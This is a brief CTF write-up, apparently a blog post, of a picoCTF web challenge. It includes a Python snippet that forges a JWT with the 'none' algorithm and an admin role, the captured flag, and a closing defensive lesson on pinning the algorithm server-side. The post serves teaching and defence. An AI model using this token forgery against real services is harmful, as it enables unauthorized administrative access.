---
title: "picoCTF: forging an admin JWT with alg=none"
date: 2026-04-22
tags: ["web", "crypto"]
section: ctfs
description: "A picoCTF web challenge defeated by the oldest JWT trick in the book — the unverified none algorithm."
---

`root@ctf:~#` The login endpoint returned a JWT. The `/admin` endpoint wanted `role: admin`. You can see where this is going.

## The token

Decoding the header showed `{"alg":"HS256","typ":"JWT"}`. The server, it turned out, also accepted `alg: none`.

## The forge

```python
import jwt
forged = jwt.encode({"user": "guest", "role": "admin"},
                    key="", algorithm="none")
```

Swap the cookie, refresh `/admin`, collect flag. `picoCTF{alg_none_still_works_2026}`.

## The lesson

If your JWT library lets `none` through by default, it isn't validating anything. Pin the algorithm server-side.
